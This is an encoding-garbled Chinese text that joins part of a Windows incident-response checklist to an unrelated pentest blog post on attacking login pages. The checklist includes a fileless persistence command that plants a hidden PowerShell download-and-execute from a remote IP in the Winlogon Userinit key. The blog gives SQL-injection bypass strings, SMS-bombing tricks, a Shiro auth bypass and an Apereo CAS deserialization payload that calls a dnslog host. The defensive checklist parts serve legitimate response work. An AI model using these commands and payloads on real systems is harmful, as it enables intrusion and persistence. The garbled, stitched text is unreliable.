å·²ç»æˆåŠŸå»ºç«‹çš„è¿æ¥

> netstat -ano | findstr "ESTABLISHED"

### 5.2.5 å¯åŠ¨é¡¹

> msconfig



> wmic startup



æ³¨å†Œè¡¨ä¸­å¯åŠ¨é¡¹:

> HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRun



> HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRunonce



æ³¨å†Œè¡¨é•œåƒåŠ«æŒ

> HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsNTCurrentVersionImage File Execution Options

å‚è€ƒï¼š http://cn-sec.com/archives/1000962.html

### 5.2.6 å®šæ—¶ä»»åŠ¡

atå‘½ä»¤

> at

schtaskså‘½ä»¤

> schtasks | more



> schtasks /query /fo LIST



> schtasks /query /v /tn "\Microsoft\windows\Bluetooths" /fo list



è®¡åˆ’ä»»åŠ¡æ¸…å•ï¼š

> C:\Windows\System32\Tasks

### 5.2.7 æœåŠ¡

å‘½ä»¤ï¼š

> services.msc

æ¶æ„æœåŠ¡æ£€æµ‹

> Get-WmiObject win32_service |?{ $_.name -eq 'svchost.exe' -and $_.PathName -notlike  '*C:\WINDOWS\System32\svchost.exe*' -and $_.PathName -notlike '*c:\Windows\SysWOW64\svchost.exe*'} | select Name, DisplayName, State, PathName



> Get-WmiObject win32_service | ?{$_.PathName -like '*svchost.exe*'} | select Name, DisplayName, @{Name="Path"; Expression={$_.PathName.split('
> ')[0]}} | Format-List

æŸ¥çœ‹æœåŠ¡è¯¦æƒ…

> wmic service get name,pathname,processid,startname,status,state /value

### 5.2.8 æ–‡ä»¶

æœ€è¿‘æ‰“å¼€çš„æ–‡ä»¶

> %UserProfile%Recent

é€šè¿‡hashæ“ä½œæ–‡ä»¶ï¼š

ï¼ˆ1ï¼‰è·å–æ–‡ä»¶MD5çš„hash

> certutil -hashfile c:\windows\system32\cmd.exe MD5 |findstr /r "^[a-fA-F0-9]*$"

ï¼ˆ2ï¼‰æŸ¥æ‰¾ç›¸åŒhashå€¼æ–‡ä»¶

> [array]$md5=Get-FileHash .\*.exe -Algorithm md5
> $md5 | Where -Property Hash -in -Value "59B18D6146A2AA066F661599C496090D","6FF97A7DABF09EBB07C157F286DC81AD"

ï¼ˆ3ï¼‰åˆ é™¤ç›¸åŒhashå€¼æ–‡ä»¶

> [array]$md5=Get-FileHash .\*.exe -Algorithm md5
> $md5 | Where -Property Hash -in -Value "59B18D6146A2AA066F661599C496090D","6FF97A7DABF09EBB07C157F286DC81AD"
> | Remove-Item

æŸ¥æ‰¾æŸä¸€æ—¥æœŸåˆ›å»ºçš„æ–‡ä»¶

> forfiles /m *.exe /d +2019/2/12 /s /p c:\  /c "cmd /c echo @path @fdate @ftime" 2>nul

æŸ¥çœ‹ç²˜æ»é”®exe ï¼š sethc.exeæ–‡ä»¶çš„åˆ›å»ºã€ä¿®æ”¹æ—¶é—´æ˜¯å¦æ­£å¸¸

æŸ¥çœ‹éšè—æ–‡ä»¶

> attrib -s -a -h -r {æ–‡ä»¶å}

æŸ¥çœ‹æ”¾å¤§é•œexe ï¼š Magnify.exeæ–‡ä»¶çš„åˆ›å»ºã€ä¿®æ”¹æ—¶é—´æ˜¯å¦æ­£å¸¸

### 5.2.9 å…¶ä»–

wmiæ— æ–‡ä»¶åé—¨æ£€æµ‹

> Get-WmiObject -Namespace root\default -list | Where-Object {$_.name -Match "^[a-z]"}
> Get-WmiObject -Namespace root\subscription -class commandlineeventconsumer
> Get-WmiObject -Namespace root\subscription -class __eventfilter
> Get-WmiObject -Namespace root\subscription -class __FilterToConsumerBinding



æ— æ–‡ä»¶åé—¨å®ç°

> 1ã€Set-ItemProperty  "HKLM:SOFTWAREMicrosoftWINDOWS NTCurrentVersionWinlogon" -name  Userinit -value "C:Windowssystem32userinit.exe,***************"
> 2ã€Set-ItemProperty  "HKLM:SOFTWAREMicrosoftWINDOWS NTCurrentVersionWinlogon" -name  Userinit -value "C:Windowssystem32userinit.exe, powershell.exe -nop  -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.131/a'))""

SDDLéšè—ç»´æŒ

å‚è€ƒï¼šhttp://cn-sec.com/archives/1000962.html

è¡¥ä¸æŸ¥çœ‹ï¼š

> wmic qfe get hotfixid

å®‰è£…è½¯ä»¶åˆ—è¡¨

> wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_Product get name /FORMAT:table

å¿«æ·æ–¹å¼åˆ—è¡¨

> wmic PATH Win32_ShortcutFile get name

DNSç¼“å­˜è®°å½•

> ipconfig /displaydns



## å…­ã€æ¶‰åŠæ¶æ„æ–‡ä»¶ç­‰æ¸…ç†

å‚è€ƒæŸ¥æ‰¾å‡ºçš„æ¶æ„æ–‡ä»¶è¿›è¡Œæ¸…ç†ï¼ŒåŒæ—¶è®°å¾—è¿›è¡Œå¤‡ä»½ï¼Œä»¥å¤‡æŸ¥

## ä¸ƒã€ç ”åˆ¤ç»“æœ

### 7.1 **æ”»å‡»è€…ç”»åƒ**

> IP
>
> åŸŸå
>
> shellå¯†ç /å‘½å
>
> æ˜µç§°ID
>
> æ‰‹æœºå·
>
> é‚®ç®±
>
> QQ
>
> å¾®ä¿¡
>
> å…¶ä»–â€¦â€¦



### 7.2 **æ€»ç»“æ”»å‡»äº‹ä»¶**

æ€»ç»“æ”»å‡»äº‹ä»¶é“¾ã€è·¯å¾„ã€å·¥å…·ã€IPã€æ”»å‡»æ‰‹æ³•(é’“é±¼ã€ç¤¾å·¥ã€webæ¸—é€ã€æ°´å‘ã€é±¼å‰)

### 7.3 **æ€»ç»“å­˜åœ¨æ¼æ´çš„é“¾è·¯**

å¦‚ä½•åˆ©ç”¨å¤šä¸ªæ¼æ´è¿›è¡Œæ”»å‡»æ¸—é€ç­‰

### 7.4 **æ€»ç»“æ”»å‡»é¢**

ï¼ˆ1ï¼‰æ˜¯å¦æ¨ªå‘ç§»åŠ¨

ï¼ˆ2ï¼‰å½±å“èµ„äº§æ•°é‡

ï¼ˆ3ï¼‰å½±å“æ•°æ®èŒƒå›´ï¼ˆæ˜¯å¦æœ‰æ•°æ®ä¸¢å¤±ï¼‰

## å…«ã€å¤„ç½®å»ºè®®

### 8.1 **å·²æ‰§è¡Œæ“ä½œ**

æ—¥å¿—å¤‡ä»½

æ¶æ„æ–‡ä»¶å¤‡ä»½

æ¶æ„æ–‡ä»¶æ¸…ç†

éæ³•è¿›ç¨‹ç»ˆæ­¢

éæ³•è¿æ¥æ–­å¼€

éæ³•IPé˜»æ–­ï¼ˆå®‰å…¨è®¾å¤‡ç›‘æ§ï¼‰

éæ³•åˆ›å»ºçš„è´¦å·æ¸…ç†

ç¦ç”¨æˆ–åˆ é™¤å¤šä½™åŠå¯ç–‘çš„è´¦å·

å…¶ä»–â€¦â€¦

### 8.2 **åç»­å»ºè®®**

ï¼ˆ1ï¼‰é’ˆå¯¹æ€§å»ºè®®

é’ˆå¯¹æ”»å‡»é“¾è·¯å­˜åœ¨çš„é£é™©è¿›è¡Œå¤„ç†å»ºè®®

ï¼ˆ2ï¼‰é€šç”¨å»ºè®®

ç¨‹åºã€æ’ä»¶ã€æ¨¡ç‰ˆç­‰ç‰ˆæœ¬å‡çº§ã€è¡¥ä¸ä¿®å¤

å®æ—¶ç›‘æ§ã€åŠ å¼ºç›‘æµ‹

å‚çœ‹å†å²æ¼æ´æŠ¥å‘Šï¼ŒåŠæ—¶ä¿®å¤å®‰å…¨é£é™©

æœåŠ¡å™¨åŠåº”ç”¨ç¨‹åºæƒé™æœ€å°åŒ–ç®¡ç†

ä¸Šçº¿ä¸‹åˆ é™¤æµ‹è¯•è´¦å·

è¿œç¨‹è¿æ¥3389/22æ‰§è¡ŒIPç™½åå•

 åŠ å¼ºå£ä»¤ç®¡ç†

 ç»†åˆ†å£ä»¤å®‰å…¨ã€å¼±å£ä»¤ä¿®å¤

ï¼ˆ3ï¼‰é’“é±¼é‚®ä»¶é˜²èŒƒæªæ–½ï¼š

  å¯¹å…¬å¸æ¥è¯´ï¼š

  1)ç»„ç»‡å‘˜å·¥è¿›è¡Œé’“é±¼é‚®ä»¶é˜²èŒƒåŸ¹è®­,æé«˜å…¨å‘˜ç½‘ç»œç©ºé—´å®‰å…¨é˜²èŒƒæ„è¯†;

  2)åœ¨å…¬å¸å†…éƒ¨ä¸å®šæœŸè¿›è¡Œé’“é±¼é‚®ä»¶å®‰å…¨æµ‹è¯•ï¼ŒåŠæ—¶å‘ç°é—®é¢˜å¹¶é‡‡å–è¡¥æ•‘æªæ–½;

  3)ä½¿ç”¨é«˜å®‰å…¨æ€§é‚®ä»¶ç³»ç»Ÿï¼Œå¹¶åŠæ—¶é…ç½®å®‰å…¨è¿‡æ»¤æœºåˆ¶;

  4)æ•¦ä¿ƒå‘˜å·¥å®‰è£…æ€æ¯’è½¯ä»¶,å¹¶åŠæ—¶æ›´æ–°ç—…æ¯’åº“.

  å¯¹ä¸ªäººæ¥è¯´ï¼š

  1)è®¤çœŸå­¦ä¹ CNCERTå‘å¸ƒçš„ã€Šé’“é±¼é‚®ä»¶æ”»å‡»é˜²èŒƒæŒ‡å—ã€‹ï¼Œåšåˆ°â€œäº”è¦â€â€œäº”ä¸è¦â€ï¼Œå¢å¼ºå®‰å…¨é˜²èŒƒæ„è¯†;

  2)ä¸è¦è½»ä¿¡å‘ä»¶äººåœ°å€æ˜¾ç¤ºçš„â€œæ˜¾ç¤ºåâ€,é‡åˆ°ç´¢è¦æ•æ„Ÿä¿¡æ¯çš„é‚®ä»¶éœ€è¦åŠæ—¶é€šè¿‡ç”µè¯æ ¸å®;

  3)åˆ‡å¿Œè½»æ˜“æ‰“å¼€é‚®ä»¶ä¸­æ–‡ä¸­çš„çŸ­é“¾æ¥,è°¨é˜²ä¸Šå½“å—éª—,é€ æˆè´¢ç‰©æŸå¤±;

  4)å®‰è£…æ€æ¯’è½¯ä»¶,é‚®ä»¶é™„ä»¶è¿è¡Œå‰å…ˆè¿›è¡Œç—…æ¯’æŸ¥æ€.

## ä¹ã€é™„å½•

### 9.1 å¸¸ç”¨åœ¨çº¿å·¥å…·

å¨èƒä¿¡æ¯ç®¡ç†å¹³å° (Beta)ï¼šhttps://ti.watcherlab.com/#/search

å‹’ç´¢ç—…æ¯’å¼•æ“

  æ·±ä¿¡æœ https://edr.sangfor.com.cn/#/information/ransom_search

  360 https://lesuobingdu.360.cn/

  å¥‡å®‰ä¿¡ https://lesuobingdu.qianxin.com/

  è…¾è®¯ https://guanjia.qq.com/pr/ls/

  VenusEye https://lesuo.venuseye.com.cn/

åå‹’ç´¢ç—…æ¯’å·¥å…·

  è…¾è®¯ https://habo.qq.com/tool/index

  é‡‘å±±æ¯’éœ¸ https://www.duba.net/dbt/wannacry.html

  ç‘æ˜Ÿ http://it.rising.com.cn/fanglesuo/index.html

  Avast https://www.avast.com/zh-cn/ransomware-decryption-tools

  Github tools https://github.com/jiansiting/Decryption-Tools

https://www.virustotal.com

https://app.any.run/

https://x.threatbook.cn/

https://ti.qianxin.com/

https://www.reg007.com/

https://www.venuseye.com.cn/

https://community.riskiq.com/

### 9.2 å¸¸ç”¨æœ¬åœ°æ£€æµ‹å·¥å…·

### 9.2.1 Linux

   linuxåŸºçº¿æ£€æŸ¥è„šæœ¬

GScan

https://github.com/grayddq/GScan

Linuxç—…æ¯’æ‰«æå·¥å…·-ClamAV

http://www.clamav.net/download.html

security_check(linux)

https://github.com/ppabc/security_check

linux-2

https://github.com/T0xst/linux

### 9.2.2 Windows

windowsä¸‹msinfo32.exe

360æ˜Ÿå›¾WEBæ—¥å¿—åˆ†æå·¥å…·

å–è¯å·¥å…·

å…±äº«è®¿é—®ç›‘æ§https://www.nirsoft.net/utils/networkopenedfiles-x64.zip

wifiä½¿ç”¨è®°å½•https://www.nirsoft.net/utils/wifihistoryview.zip

usbä½¿ç”¨è®°å½•https://www.nirsoft.net/utils/usblogview.zip

å†…å­˜å–è¯DumpIt

moonsols http://www.moonsols.com/

Volatility

 https://www.volatilityfoundation.org/releases-vol3

  https://www.volatilityfoundation.org/releases

Ghost é•œåƒæµè§ˆhttps://www.symantec.com/connect/blogs/ghost-explorer

windows æ—¥å¿—åˆ†æå·¥å…·LogParser

ä¸‹è½½:https://www.microsoft.com/en-us/download/confirmation.aspx?id=24659

ä½¿ç”¨ï¼šæŸ¥è¯¢ç”¨æˆ·ç™»å½•æƒ…å†µ

> LogParser.exe -i:EVT "SELECT TimeGenerated,EXTRACT_TOKEN(Strings,5,'|') AS USERNAME,EXTRACT_TOKEN(Strings,5,'|') AS SERVICE_NAME,EXTRACT_TOKEN(Strings,5,'|') AS Client_IP FROM 'C:Userswp_bj_windowsDesktopå®‰å…¨.evtx' WHERE EventID=4624"



æŸ¥è¯¢ç™»å½•æˆåŠŸçš„äº‹ä»¶

> LogParser.exe -i:EVT â€“o:DATAGRID "SELECT * FROM 'C:Userswp_bj_windowsDesktopå®‰å…¨.evtx' where EventID=4624"

pchunterã€ç«ç»’å‰‘ã€auturuns ã€Process Explorerã€promonã€Dç›¾

Windowså…¨æ—¥å¿—æå–å·¥å…·FullEventLogViewï¼šhttp://www.nirsoft.net/utils/fulleventlogview-x64.zip

### 9.4 ååˆ¶

mysql ï¼š è·å–å¾®ä¿¡idã€æµè§ˆå™¨çš„sqliteæ–‡ä»¶

ä¼ªè£…v#p%næ–‡ä»¶ï¼Œæ”¾ç½®ç½‘ç«™è¿›è¡Œä¸‹è½½

jsonp





åœ¨æ—¥å¸¸æ¸—é€æµ‹è¯•æˆ–è€…hwä¸­ï¼Œé‡åˆ°æœ€å¤šçš„é¡µé¢å¯èƒ½å°±æ˜¯ç™»å½•é¡µé¢äº†ã€‚

åœ¨æˆ‘åˆšå…¥èŒæ—¶ æœ€è®©æˆ‘å¤´ç–¼çš„å°±æ˜¯è¿™ç§æƒ…å†µï¼Œåœ¨ç»å†äº†è¿™å¤§åŠå¹´çš„å·¥ä½œå’Œå­¦ä¹ ä¸‹ï¼Œæˆ‘æŠŠæˆ‘å¯¹äºè¿™ç§æƒ…å†µçš„æ€è·¯å’Œæ–¹æ³•åˆ†äº«ä¸€ä¸‹ï¼š

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhmIOticw72F3JEibiaqWstN2Op8MCvTHSQ8gsd8aFmIREH8OfmpKbZn7SA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

##  

## å…³äºç™»å½•æ¡†å‡ºç°çš„æ¼æ´

------

###  

### **1. æ˜æ–‡ä¼ è¾“/ä¸å®‰å…¨çš„åŠ å¯†ç®—æ³•/ç”¨æˆ·åå¯æšä¸¾/çˆ†ç ´å¼±å£ä»¤/éªŒè¯ç ç»•è¿‡**

è¿™å‡ ä¸ªå°±æ”¾ä¸€èµ·äº†ï¼Œæ€»ç»“èµ·æ¥å°±ä¿©å­—`çˆ†ç ´`

- æ˜æ–‡ä¼ è¾“/ä¸å®‰å…¨çš„åŠ å¯†ç®—æ³•ï¼šçœ‹ä¼¼äººç•œæ— å®³çš„æ¼æ´å´ç»™æš´åŠ›ç ´è§£å¸¦æ¥äº†å¯èƒ½æ€§
- ç”¨æˆ·åæšä¸¾ï¼šåˆç»™çˆ†ç ´å¢åŠ äº†æˆåŠŸç‡ è¿™é‡Œè¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ æœ‰çš„ç«™ç‚¹çš„å›æ˜¾åªæœ‰ä¸€ç‚¹ç‚¹ä¸åŒ æ¯”å¦‚ï¼š(ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯--ç”¨æˆ·å/å¯†ç é”™è¯¯) (éƒ½2077å¹´äº†,ä¸ä¼šè¿˜æœ‰ç«™è€è€å®å®å‘Šè¯‰ä½ ç”¨æˆ·åä¸å­˜åœ¨å§ğŸ˜‚)
- éªŒè¯ç ç»•è¿‡ï¼šéªŒè¯ç ä¸åˆ·æ–° (è¿™ç§å°±æ˜¯çº¯æ‘†è®¾éªŒè¯ç )ï¼›ä¸‡èƒ½éªŒè¯ç  (å¦‚8888ï¼Œ0000ä¸€èˆ¬ä¸ºå¼€å‘è€…ä¸ºäº†æµ‹è¯•æ–¹ä¾¿è®¾ç½®çš„)ï¼›éªŒè¯ç å›æ˜¾ (æœ‰çš„ç½‘ç«™éªŒè¯ç ä¼šå›æ˜¾åˆ°å‰ç«¯ï¼Œåªéœ€è¦æŠ“åŒ…å³å¯è·å¾—éªŒè¯ç )ï¼›éªŒè¯ç è¯†åˆ«(å®åœ¨æ˜¯ç»•ä¸è¿‡å»è¿˜æœ‰è¿™æœ€åä¸€ä¸ªæ–¹æ³• è¿™é‡Œé™„ä¸Šæˆ‘å¸¸ç”¨çš„bpéªŒè¯ç è¯†åˆ«æ’ä»¶ https://github.com/smxiazi/NEW_xp_CAPTCHA
- ç¤¾å·¥å­—å…¸: æ¨èä¸€ä¸ªå°å·¥å…·,å¯ä»¥æ ¹æ®æ”¶é›†åˆ°çš„ä¿¡æ¯ç”Ÿæˆé’ˆå¯¹æ€§è¾ƒå¼ºçš„å¯†ç 

- 

```
https://github.com/jx4321/genpass
```

### 

### ** **

------

###  

### **2. SQLæ³¨å…¥**



ç›´æ¥åœ¨ç™»å½•æ¡†å­˜åœ¨sqlæ³¨å…¥çš„ç«™è¶Šæ¥è¶Šå°‘äº†ï¼Œä¸è¿‡è¿˜æ˜¯è¦æµ‹ä¸€æµ‹çš„ ä¼šæœ‰æƒŠå–œå‘ç”Ÿçš„å‘¦

- ä¸‡èƒ½å¯†ç : è¿™æ— ç–‘æ˜¯æœ€ç®€å•ä¹Ÿæ˜¯æœ€å¥½ç”¨çš„sqlæ³¨å…¥,è‹¥å­˜åœ¨æ­¤æ¼æ´å¯ç›´æ¥ç»•è¿‡ç™»å½•è®¿é—®ç³»ç»Ÿå†…éƒ¨èµ„æº(éšç€å¯¹å®‰å…¨è¿™ç§æƒ…å†µè¶Šæ¥è¶Šå°‘,å…¥èŒæ¥åªé‡åˆ°è¿‡ä¸€æ¬¡)  å¸¸è§ä¸‡èƒ½å¯†ç å¦‚ä¸‹:



```
or 1=1--  
'or 1=1--  
a'or' 1=1--  
"or 1=1--
......   (å¯ç›´æ¥æ”¾åˆ°æšä¸¾ç”¨æˆ·åçš„å­—å…¸é‡Œé¡ºä¾¿ä¸€èµ·è·‘äº†)
```



- ç™»å½•æ¡†sqlæ³¨å…¥ï¼šè¿™ç§åº”è¯¥æ¯”ä¸‡èƒ½å¯†ç æ›´å°‘è§ï¼Œä½†æ˜¯ç†è®ºä¸Šä¹Ÿå­˜åœ¨ï¼ˆæ¯”å¦‚å¼€å‘æ—¶åªå¯¹ä¸‡èƒ½å¯†ç è¿›è¡Œäº†è¿‡æ»¤,è¿‡æ»¤ä¸å…¨ï¼‰å¯ä»¥é€šè¿‡åŠ ç‰¹å®šå­—ç¬¦æ¥æµ‹è¯•æ˜¯å¦å­˜åœ¨ å¦‚ `'` `"` `#`

------

### ** **

### **3. é€»è¾‘æ¼æ´**



æµ‹è¯•ç™»é™†é¡µé¢æ˜¯å¦å­˜åœ¨é€»è¾‘æ¼æ´ å¦‚ï¼šä»»æ„å¯†ç é‡ç½®ï¼Œä»»æ„è´¦å·æ³¨å†Œï¼ŒçŸ­ä¿¡ï¼ˆé‚®ä»¶ï¼‰è½°ç‚¸ç­‰ã€‚

- ä»»æ„å¯†ç é‡ç½®ï¼šä¸€èˆ¬å­˜åœ¨ä¸å…ˆéªŒè¯èº«ä»½ï¼Œä¸‹ä¸€æ­¥ï¼Œé‡ç½®å¯†ç (ä¿®æ”¹å¯†ç )çš„ç³»ç»Ÿï¼Œæˆ–éªŒè¯ç ä¸æ‰‹æœºå·ä¸ç»‘å®šçš„ç³»ç»Ÿã€‚


![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhs1aqofzbibPwPSDzL0QwjUd2soRcFHl5DJJCpMz7LIoYia3Wo1BWD8Zw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)   ![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhVtBG3WBrlOo1kyg8GXicicFCvL9XGfn2oiaJibyTia9QJVQzxr7ayHyI1TA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)    ![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhVtBG3WBrlOo1kyg8GXicicFCvL9XGfn2oiaJibyTia9QJVQzxr7ayHyI1TA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



- ä»»æ„è´¦æˆ·æ³¨å†Œï¼šæ¼æ´åŸç†åŸºæœ¬ä¸ä»»æ„å¯†ç é‡ç½®ç›¸åŒ,éªŒè¯ç æœªä¸æ‰‹æœºå·ç»‘å®šæˆ–éªŒè¯ç å¯çˆ†ç ´
- çŸ­ä¿¡(é‚®ç®±)è½°ç‚¸ï¼šæœªå¯¹å‘é€é—´éš”ï¼Œä¸€æ®µæ—¶é—´å†…å‘é€æœ€å¤§æ•°é‡åšæœåŠ¡ç«¯éªŒè¯ï¼ŒæŠ“åŒ…åä¸æ–­é‡è¿”å³å¯ï¼Œè‹¥åšäº†ä¸€å®šé˜²æŠ¤å¯æ·»åŠ  `ç©ºæ ¼` `+86` ç­‰è¿›è¡Œç»•è¿‡ã€‚
  ä¸‹å›¾ä»¥é‚®ç®±è½°ç‚¸ä¸ºä¾‹ï¼š


![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhNX45jocMGvPpLG3HFNxfjTibXKX9eJu26dyWFos3qicWKlSLw8PxfXug/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhCU96U2saaF1z11InLiar9iaseZL9CZFyRpUUq1RWRX7earxibGDLvElbw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

- ä¿®æ”¹Resposè¿”å›ä¿¡æ¯ï¼šResponseçŠ¶æ€å€¼ï¼Œå°±æ˜¯åœ¨æœåŠ¡å™¨å‘é€æŸä¸ªå¯†ç é‡ç½®çš„å‡­æ®ä¹‹åï¼Œå‡ºç°ç‰¹å®šçš„å“åº”å€¼,å¯¹ResponseçŠ¶æ€å€¼ä¿®æ”¹åï¼Œå¦‚æœå­˜åœ¨æ ¡éªŒä¸ä¸¥(å­˜åœ¨é€»è¾‘æ¼æ´)ï¼Œå¹¶ä¸”å›æ˜¾å€¼å¾—æ ¡éªŒæ˜¯åœ¨å®¢æˆ·ç«¯è¿›è¡Œï¼Œå°±èƒ½ä½¿ç›¸å…³æ“ä½œæˆåŠŸè¢«æ‰§è¡Œã€‚
  æŸ¥çœ‹è¿”å›åŒ…ç»“æ„ï¼š


![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhgp0dibAtL94J7mFiarOOictmibuDv1xy1ib3NFcVvheTSTCrX2F8qxL3o9g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
ä¿®æ”¹çŠ¶æ€å€¼ï¼š
![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhvuHpptejjmXSHhAAUDNibFShCTg3YutLy47pP9CLBb26hibSAUcaUobQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
æˆåŠŸè¿›å…¥ç³»ç»Ÿï¼š
![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhwRIRKSMVibI4OtfEpLBywPW8U0jsk6tz1U3JovU8FlRTUjXqFWicGp7A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

###  

------

###  

### **4. æ¡†æ¶æ¼æ´**



- shiro/log4j/fastjson ååºåˆ—åŒ–: è¿™ä¸‰ä¸ªååºåˆ—åŒ–æ¼æ´å½±å“å®åœ¨æ˜¯å¤ªå¹¿äº†,å‰ä¸¤å¹´hwç‰¹åˆ«å¸¸è§,è¿™é‡Œå°±æ¨èå‡ ä¸ªbpçš„æ‰«ææ’ä»¶å§(å‡ ä¹ä¸ç”¨æ‰‹åŠ¨æµ‹ å…¨é æ’ä»¶)

- 
- 

```
https://github.com/EASY233/BpScan(å¯è¢«åŠ¨æ‰«ælog4j,fastjsonååºåˆ—åŒ–æ¼æ´)https://github.com/pmiaowu/BurpShiroPassiveScan(ç”¨æ¥æ‰«æshiroååºåˆ—åŒ–)
```



ä¸‹å›¾ä¸ºfastjsonååºåˆ—åŒ–æ¼æ´ï¼š
![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhBIhTDRqaOkqicWBHRrraJbXRgdGaxlwga8IG2ETiap9BFCrhYxHU4zMg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhtWxfeniatnOohJwptuJo0xcIicic5Dove2M1xOicJvXeyYVTL4LnuB5nUQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

- apereo-casååºåˆ—åŒ–ï¼špereo CASæ˜¯ä¸€æ¬¾Apereoå‘å¸ƒçš„é›†ä¸­è®¤è¯æœåŠ¡å¹³å°ï¼Œå¸¸è¢«ç”¨äºä¼ä¸šå†…éƒ¨å•ç‚¹ç™»å½•ç³»ç»Ÿã€‚å…¶4.1.7ç‰ˆæœ¬ä¹‹å‰å­˜åœ¨ä¸€å¤„é»˜è®¤å¯†é’¥çš„é—®é¢˜ï¼Œåˆ©ç”¨è¿™ä¸ªé»˜è®¤å¯†é’¥æˆ‘ä»¬å¯ä»¥æ„é€ æ¶æ„ä¿¡æ¯è§¦å‘ç›®æ ‡ååºåˆ—åŒ–æ¼æ´
  éšä¾¿è¾“å…¥è´¦å·å¯†ç æŠ“åŒ…


![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhyZjicfEB4iaiaN8yjypgfvUOorWtQwxDPjZQAnPnDyaP904BN5pcADEpg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
ä½¿ç”¨ï¼š

https://github.com/vulhub/Apereo-CAS-Attack/releases/download/v1.0.0/apereo-cas-attack-1.0-SNAPSHOT-all.jar æ­¤å·¥å…·ç”Ÿæˆpayload å‘½ä»¤å¦‚ä¸‹

- 

```
java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "curl aaa.dw7b1h.dnslog.cn"
```

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhtX5CzDViahKDsAkuXBg7oNQbaIVhZsoy7PycvPGEr2icbR4WicemA26AA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
å°†ç”Ÿæˆçš„payloadæ›¿æ¢è¯·æ±‚åŒ…ä¸­çš„executionå‚æ•°å‘é€å³å¯
![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhLRicvs4AibdppRyxcwd9LcPtE13YIEjh8bAwia2C5farW5a2Zic206jmxw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhs7wicAiaF9rz1IVRyOyicyD6rGFpiaBXts8jb1xYm2ILnDeFzL2gOq9chQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

- shiroæƒé™ç»•è¿‡: åœ¨è·¯ç”±ä¸­æ‹¼æ¥`/;`,
  å¤ç°é¶åœº  https://github.com/l3yx/springboot-shiro
  å¦‚æœç›´æ¥è®¿é—® /test/admin/page ï¼Œä¼šè¿”å›302è·³è½¬è¦æ±‚ç™»å½•


![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhO8zPiceK5pOiarXm6iabaGEsnwHmyQqsicSD1wNbd1Eib0iaN82kb6je18QA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
ä½†æ˜¯è®¿é—®/;/test/admin/page , å°±èƒ½ç›´æ¥ç»•è¿‡ Shiro æƒé™éªŒè¯ï¼Œè®¿é—®åˆ° /admin è·¯ç”±ä¸­çš„ä¿¡æ¯
![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhTAI373HrYxNSmc7OHwGfyKjF7X8K6UTiapfh0Umv3aV1ZdokPQYh5pw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

- cmsæ¼æ´: å¯å€ŸåŠ©æŒ‡çº¹è¯†åˆ«ç³»ç»Ÿåˆ¤æ–­ç«™ç‚¹æ˜¯å¦ä¸ºcmsæ­å»º,å¦‚æœæ˜¯å¯å€ŸåŠ©æ¼æ´åº“æŸ¥è¯¢å†å²å…¬å¼€æ¼æ´è¿›è¡Œæµ‹è¯• ä¸‹é¢æ¨èå‡ ä¸ªå¸¸ç”¨çš„åœ°å€

- 
- 
- 

```
